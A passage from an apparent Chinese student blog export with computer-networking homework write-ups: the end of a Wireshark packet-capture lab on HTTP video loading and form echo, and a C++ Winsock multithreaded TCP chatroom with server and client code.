<h3 id="获取视频信息"><a href="#获取视频信息" class="headerlink" title="获取视频信息"></a>获取视频信息</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">video</span> <span class="attr">width</span>=<span class="string">"300"</span><span class="attr">height</span>=<span class="string">"240"</span><span class="attr">controls</span>=<span class="string">"controls"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"video.mp4"</span>,<span class="attr">type</span>=<span class="string">"video/mp4"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112211017884.png"  alt="image-20201112211017884"></p>
<p>捕捉到一系列数据包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112210246578.png"  alt="image-20201112210246578"></p>
<ol>
<li><p>TCP包中的<strong>win</strong>代表接收窗口的大小，即表示这个包的发送方当前还有多少缓存区可以接收数据</p>
</li>
<li><p><strong>TS</strong>(Timestamps) Timestamps在tcp选项中包括两个32位的timestamp: <strong>TSval</strong>(Timestamp value)和<strong>TSecr</strong>(Timestamp Echo Reply)。如果设置了<strong>TS</strong>这个选项，发送方发送时，将当前时间填入<strong>TSval</strong>，接收方回应时，将发送方的<strong>TSval</strong>填入<strong>TSecr</strong>即可(注意发送或接收都有设置<strong>TSval</strong>和<strong>TSecr</strong> )。</p>
</li>
<li><p><strong>“TCP segment of a reassembled PDU”</strong>，指TCP层收到上层大块报文后分解成段后发出去</p>
</li>
<li><p><strong>PSH</strong>所表达的是发送方通知接收方传输层应该尽快的将这个报文段交给应用层</p>
</li>
</ol>
<p>通过观察可以发现消息显示出明显的<strong>周期性</strong>，即服务器发送三条消息，最后一条带有psh标志，客户端回应一条ack消息，且len=0</p>
<p>最后，返回状态码206，表示部分请求成功，视频获取完毕<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112211755746.png"  alt="image-20201112211755746"></p>
<h3 id="在文本框输入信息并回显"><a href="#在文本框输入信息并回显" class="headerlink" title="在文本框输入信息并回显"></a>在文本框输入信息并回显</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>1811494<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">			<span class="function"><span class="keyword">function</span> <span class="title">getLoginMsg</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">				loginMsg=<span class="built_in">document</span>.loginForm;</span></span><br><span class="line"><span class="actionscript">				alert(<span class="string">"name:"</span>+loginMsg.userName.value+<span class="string">"\n"</span>);</span></span><br><span class="line">			&#125;</span><br><span class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"loginForm"</span>&gt;</span></span><br><span class="line">			name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"userName"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">onclick</span>=<span class="string">"getLoginMsg()"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112214858365.png"  alt="image-20201112214858365" style="zoom:80%;">

<p>输入姓名，点击submit</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112214932278.png"  alt="image-20201112214932278"></p>
<p>页面回显，但是在wireshark中没有找到回显内容相关数据包，猜测是因为使用了alert的函数是由浏览器直接处理的，并不将数据提交至服务器</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112214956163.png"  alt="image-20201112214956163" style="zoom:80%;">

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112220026261.png"  alt="image-20201112220026261" style="zoom:50%;">

<ol>
<li>在实验过程中，我们发现，当第一次请求页面并请求成功时，页面会返回状态码200表示请求成功，并同时返回页面的html内容；当再次请求且页面没有修改时会返回304表示页面未修改可以直接使用浏览器缓存的内容</li>
<li>传输流程整体为：<ol>
<li>客户端发出请求，服务器在局域网内（因为使用的是本地的虚拟机）发送查找网卡请求并找到ip对应的物理地址</li>
<li>三次握手建立连接</li>
<li>进行页面请求，服务器返回html内容</li>
<li>请求并返回图片和视频等内容</li>
<li>四次挥手断开连接</li>
</ol>
</li>
</ol>
<hr>
<p>参考：</p>
<ul>
<li><p><a href="https://www.wireshark.org/docs/wsdg_html_chunked/" target="_blank" rel="noopener">https://www.wireshark.org/docs/wsdg_html_chunked/</a></p>
</li>
<li><p><a href="https://blog.csdn.net/chenpuo/article/details/108186444" target="_blank" rel="noopener">https://blog.csdn.net/chenpuo/article/details/108186444</a></p>
</li>
<li><p><a href="https://blog.csdn.net/lixiangminghate/article/details/83024865" target="_blank" rel="noopener">https://blog.csdn.net/lixiangminghate/article/details/83024865</a></p>
</li>
<li><p><a href="https://blog.csdn.net/chenlycly/article/details/52402945" target="_blank" rel="noopener">https://blog.csdn.net/chenlycly/article/details/52402945</a></p>
</li>
<li><p><a href="https://blog.csdn.net/asdfsadfasdfsa/article/details/88090027" target="_blank" rel="noopener">https://blog.csdn.net/asdfsadfasdfsa/article/details/88090027</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业1 利用Socket编写一个聊天程序</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="实验1：利用Socket编写一个聊天程序"><a href="#实验1：利用Socket编写一个聊天程序" class="headerlink" title="实验1：利用Socket编写一个聊天程序"></a>实验1：利用Socket编写一个聊天程序</h1><h2 id="0-摘要"><a href="#0-摘要" class="headerlink" title="0. 摘要"></a>0. 摘要</h2><p>本次实验利用C++语言，编写了基于$TCP$的流式$SOCKET$的简易聊天室。利用$Winsock2.h$头文件编写了一个$WIN32$平台下的程序。该程序可以完成指定人数聊天室的创建，程序主要分为服务器端和客户端，服务器端负责接收客户端消息，解析报文，并将其转发至对应的接收者。在客户端程序中利用多线程编程，可以使消息的收和发之间不相互影响，可以连续发送多条消息，也可以连续接收多条消息。</p>
<h2 id="1-聊天协议说明"><a href="#1-聊天协议说明" class="headerlink" title="1. 聊天协议说明"></a>1. 聊天协议说明</h2><h3 id="文字编码方式"><a href="#文字编码方式" class="headerlink" title="文字编码方式"></a>文字编码方式</h3><p>为了支持中文和英文，使用<strong>UNICODE编码</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201030155536084.png"  alt="image-20201030155536084"></p>
<h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p>本次实验进行了报文格式的简要设计，其内容为<strong>发送方+接收方+消息内容</strong>，在传输过程中采用字符串<strong>char*</strong>格式，为了方便解析，我还定义了<code>msg_form</code>类，方便报文内容的提取：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">msg_form</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> from_name;<span class="comment">//发送方标号</span></span><br><span class="line">	<span class="keyword">char</span> to_name;<span class="comment">//接收方</span></span><br><span class="line">	<span class="keyword">char</span> msg[BUF_SIZE];<span class="comment">//消息内容</span></span><br></pre></td></tr></table></figure>

<p>注：本次实验只是<strong>简要设计</strong>，没有加入帧校验码等其它内容，并且只用了<strong>一个字节代表不同的客户端</strong>。在实际操作过程中，不同的客户端应用不同IP地址和端口号区分。</p>
<p>为了方便<code>msg_form</code>和<code>char*</code>之间的转换，定义了两个函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">msg_to_string</span><span class="params">(msg_form a)</span></span>;<span class="comment">//用字符串存储报文</span></span><br><span class="line"><span class="function">msg_form <span class="title">string_to_msg</span><span class="params">(<span class="keyword">char</span> a[])</span></span>;<span class="comment">//将字符串恢复成类</span></span><br></pre></td></tr></table></figure>

<p>通过类型转换，我们可以更加方便快捷的设置和提取报文中的信息</p>
<h3 id="聊天过程"><a href="#聊天过程" class="headerlink" title="聊天过程"></a>聊天过程</h3><ul>
<li><p>设置聊天室人数CLIENTNUM</p>
</li>
<li><p>先开启服务器端(server.cpp)，建立socket，绑定ip和端口号，进入<strong>监听</strong>模式进行等待</p>
</li>
<li><p>开启客户端程序，设置相关信息，对服务器发出<strong>connect请求</strong></p>
</li>
<li><p>服务器<strong>accept</strong>客户端的连接请求，并建立专属的连接通道，返回给客户端<strong>编号信息</strong>，等到达到预设的聊天人数即可开始聊天</p>
</li>
<li><p>客户端每次输入的消息格式为<strong>收信方编号+消息内容</strong>，在发送之前，该字符串前会被添加上<strong>发送者的编号</strong>。所以实际sendBuf中的内容为<strong>发送和编号+收信方编号+消息内容</strong></p>
</li>
<li><p>服务器接收到信息后进行<strong>解析</strong>得到<strong>目的地址</strong>（本次程序简化为编号而不是ip），并有针对性的进行转发</p>
</li>
<li><p>当用户想要退出聊天室时，输入<strong>任意编号+quit</strong>即可退出程序，当服务端检测到<strong>在线人数为0时，自动退出程序</strong></p>
</li>
</ul>
<h2 id="2-编程程序说明"><a href="#2-编程程序说明" class="headerlink" title="2. 编程程序说明"></a>2. 编程程序说明</h2><ul>
<li><p>本程序基于<strong>WinSock2.h</strong>进行编写，并且需要链接<strong>ws2_32.lib库</strong>到此项目中</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;//windows socket 编程头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32.lib"</span>)<span class="comment">//链接ws2_32.lib库文件到此项目中</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>加载socket库</strong>，并约定使用的<strong>socket版本</strong>，对其进行<strong>初始化</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载socket库</span></span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="comment">//MAKEWORD(2.2),成功返回0</span></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"socket初始化失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建socket</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个socket，并将该socket绑定到一个特定的传输层</span></span><br><span class="line">SOCKET sockSer = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//地址类型（ipv4），服务类型（流式套接字）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>对<strong>端口和ip地址进行初始化</strong></p>
<p>ip地址可以是本机或者其它任意可以ping通的地址</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化地址</span></span><br><span class="line">SOCKADDR_IN addrSer</span><br><span class="line">addrSer.sin_addr.s_addr = inet_addr(<span class="string">"192.168.89.1"</span>);<span class="comment">//本机ip地址中的一个</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//使用ipv4</span></span><br><span class="line">addrSer.sin_port = htons(PORT);<span class="comment">//指定端口号，这是PORT=6666（可以打开的任意端口即可）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>server端需要将socket和ip、端口等内容进行<strong>绑定</strong>，当bind函数返回值为-1时，说明绑定出错</p>
<p>为例<strong>方便赋值</strong>，addrSer声明时为<strong>SOCKADDR_IN</strong>类型，但是<strong>SOCKADDR</strong>内全部为char<em>类型类型更*</em>方便传输**</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201030143400096.png"  alt="image-20201030143400096">)<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201030143417834.png"  alt="image-20201030143417834"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bind(sockSer, (SOCKADDR*)&amp;addrSer, <span class="keyword">sizeof</span>(SOCKADDR)) == <span class="number">-1</span>)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"bind error"</span> &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//强制类型转换，SOCKADDR_IN方便赋值 SOCKADDR方便传输</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>server</strong>端使用<strong>listen</strong>函数进入监听模式，<strong>client</strong>发起<strong>connect</strong>请求，<strong>server</strong>端以此进行<strong>accept</strong>，同时server端可以统计<strong>连接client数目</strong>，并<strong>为client分配标号</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SOCKET sockConn[CLIENTNUM];<span class="comment">//在宏定义中声明CLIENTNUM为2，可以修改宏为多个</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTNUM; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">listen</span>(sockSer, <span class="number">5</span>);</span><br><span class="line">    	<span class="comment">//为每个客户端分配一个socket连接，将客户端的相关信息存储在addrCli中</span></span><br><span class="line">		sockConn[i] = accept(sockSer, (SOCKADDR*)&amp;addrCli, &amp;len);</span><br><span class="line">		<span class="keyword">if</span> (sockConn[i] != INVALID_SOCKET)<span class="comment">//成功建立socket</span></span><br><span class="line">		&#123;</span><br><span class="line">			cond++;<span class="comment">//人数加一</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"用户"</span> &lt;&lt; i &lt;&lt; <span class="string">"进入聊天"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">char</span> buf[<span class="number">12</span>]=<span class="string">"你的id是："</span>;</span><br><span class="line">			buf[<span class="number">10</span>] = <span class="number">48</span> + i;<span class="comment">//简化，最多九个人</span></span><br><span class="line">			buf[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">			send(sockConn[i], buf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"connecting"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//发出连接请求,addrSer是服务器端的ip地址和端口号</span></span><br><span class="line">sockCli = <span class="built_in">connect</span>(sockClient, (SOCKADDR*)&amp;addrSer, <span class="keyword">sizeof</span>(SOCKADDR));</span><br><span class="line"><span class="keyword">if</span> (sockCli != SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"connected"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> recvBuf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">        <span class="comment">//接受服务器端分配的编号</span></span><br><span class="line">        recv(sockClient, recvBuf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (recvBuf[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; recvBuf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">//将char型编号转为int格式存储</span></span><br><span class="line">            ID = recvBuf[<span class="number">10</span>] - <span class="number">48</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            Sleep(<span class="number">30</span>);<span class="comment">//防止循环快速执行，占用大量资源</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>当连接人数达到预设数量时，可以开始聊天</p>
</li>
<li><p><strong>server端</strong>负责<strong>接收client发来的消息，解析目的地址并进行转发</strong>，为了可以<strong>同时接收到不同客户端发来的消息</strong>，这里使用多线程编程使得<strong>for循环内的线程可以同时执行</strong>并<strong>使用while(1)不断循环执行收发线程</strong>，为了减小CPU的负担，设置每个转发线程结束后要等待200ms。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CLIENTNUM; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//线程函数</span></span><br><span class="line">			hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest, LPVOID(i), <span class="number">0</span>, &amp;dwThreadId);</span><br><span class="line">            <span class="comment">//等待</span></span><br><span class="line">			WaitForSingleObject(hThread, <span class="number">200</span>);</span><br><span class="line">            <span class="comment">//线程资源释放</span></span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">if</span> (!cond)<span class="keyword">break</span>;<span class="comment">//退出程序，后续详细介绍</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数参数是在连接时服务器为客户端分配的<strong>编号</strong>，</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">//指定一个socket通道（即指定接收一个客户端发来的消息）</span></span><br><span class="line">	SOCKET sockettemp = sockConn[(<span class="keyword">int</span>)lparam];</span><br><span class="line">    <span class="comment">//生成局部变量recvBuf，并初始化为全0</span></span><br><span class="line">	<span class="keyword">char</span> recvBuf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//接收client发来的消息</span></span><br><span class="line">	recv(sockettemp, recvBuf, <span class="number">1000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//如果第一个字符不是'\0’即接收到了消息</span></span><br><span class="line">	<span class="keyword">if</span> (recvBuf[<span class="number">0</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; recvBuf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//将字符串转为消息格式</span></span><br><span class="line">		msg_form m = string_to_msg(recvBuf);</span><br><span class="line">        <span class="comment">//读取目的地址</span></span><br><span class="line">		<span class="keyword">int</span> id = m.to_name<span class="number">-48</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; id &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">//进行对应的消息转发</span></span><br><span class="line">		send(sockConn[id], recvBuf, <span class="number">50</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//退出程序，后面详述</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(m.msg, <span class="string">"quit"</span>))</span><br><span class="line">&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"用户"</span> &lt;&lt; (<span class="keyword">int</span>)lparam &lt;&lt; <span class="string">"退出聊天"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			cond--; <span class="keyword">if</span> (!cond)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于<strong>client</strong>端，由于<strong>消息的收发没有顺序</strong>，且用户从键盘<strong>输入信息</strong>会造成<strong>阻塞</strong>，所以需要将<strong>消息的收和发放在两个不同的线程里</strong>，同样，将线程函数放在<strong>while(1)循环中以不断执行</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程</span></span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line">DWORD dwThreadId1, dwThreadId2;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)<span class="comment">//不断循环知道用户输入quit命令</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//发送消息线程</span></span><br><span class="line">    hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest1, LPVOID(sockClient), <span class="number">0</span>, &amp;dwThreadId1);</span><br><span class="line">    <span class="comment">//接收消息线程</span></span><br><span class="line">    hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, handlerRequest2, LPVOID(sockClient), <span class="number">0</span>, &amp;dwThreadId2);</span><br><span class="line">    <span class="comment">//延迟</span></span><br><span class="line">    WaitForSingleObject(hThread1, <span class="number">200</span>);</span><br><span class="line">    WaitForSingleObject(hThread2, <span class="number">200</span>);</span><br><span class="line">    <span class="comment">//释放线程资源</span></span><br><span class="line">    CloseHandle(hThread2);</span><br><span class="line">    CloseHandle(hThread1);</span><br><span class="line">    <span class="comment">//退出</span></span><br><span class="line">    <span class="keyword">if</span> (cond) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>发送消息线程，注意，用户输入消息时，第一位应为<strong>消息接收方编号</strong>，然后程序自动为其在缓冲区首部添加<strong>发送方编号</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest1</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">//初始化两个buffer全部为0</span></span><br><span class="line">	<span class="keyword">char</span> sendBuf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">buffer</span>[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//接收传进线程函数的参数</span></span><br><span class="line">	SOCKET socketClient = (SOCKET)(LPVOID)lparam;</span><br><span class="line">    <span class="comment">//使用getline函数，防止因为空格等字符终止读入</span></span><br><span class="line">	<span class="built_in">cin</span>.getline(<span class="built_in">buffer</span>, <span class="number">2048</span>, <span class="string">'\n'</span>);</span><br><span class="line">    <span class="comment">//发送的消息第一位为发送方编号</span></span><br><span class="line">	sendBuf[<span class="number">0</span>] = ID + <span class="number">48</span>;</span><br><span class="line">    <span class="comment">//用户从键盘输入消息时，第一位为消息接收方编号</span></span><br><span class="line">	<span class="built_in">strcat</span>(sendBuf, <span class="built_in">buffer</span>);</span><br><span class="line">    <span class="comment">//发送消息</span></span><br><span class="line">	send(socketClient, sendBuf, <span class="number">2048</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">//分析将要发送的字符串</span></span><br><span class="line">	msg_form m = string_to_msg(sendBuf);</span><br><span class="line">    <span class="comment">//如果message部分是quit则退出程序</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(m.msg, <span class="string">"quit"</span>) || !<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, <span class="string">"quit"</span>))</span><br><span class="line">		cond = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接收消息线程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest2</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化接收消息缓冲区为全0</span></span><br><span class="line">	<span class="keyword">char</span> recvBuf[BUF_SIZE] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//接收参数</span></span><br><span class="line">	SOCKET socketClient = (SOCKET)(LPVOID)lparam;</span><br><span class="line">	<span class="comment">//接收发来的消息</span></span><br><span class="line">	recv(socketClient, recvBuf, <span class="number">2048</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//如果消息不为空</span></span><br><span class="line">	<span class="keyword">if</span> (recvBuf[<span class="number">0</span>])</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//对消息进行解析和打印</span></span><br><span class="line">		msg_form m = string_to_msg(recvBuf);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; m.from_name &lt;&lt; <span class="string">": "</span> &lt;&lt; m.msg &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>程序的退出</p>
<ul>
<li><p>对于<strong>client</strong>端，需要由用户手动输入<strong>quit</strong>指令，为了简化代码，这里依然要使用<strong>编号+quit</strong>格式，但是编号可以是任意的一位数字</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//状态码</span></span><br><span class="line"><span class="keyword">int</span> cond;<span class="comment">//在全局变量区声明，初值为0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//消息发送函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">handlerRequest1</span><span class="params">(LPVOID lparam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	......</span><br><span class="line">    <span class="comment">//如果消息为“quit，则修改状态码为1</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(m.msg, <span class="string">"quit"</span>) )</span><br><span class="line">		cond = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

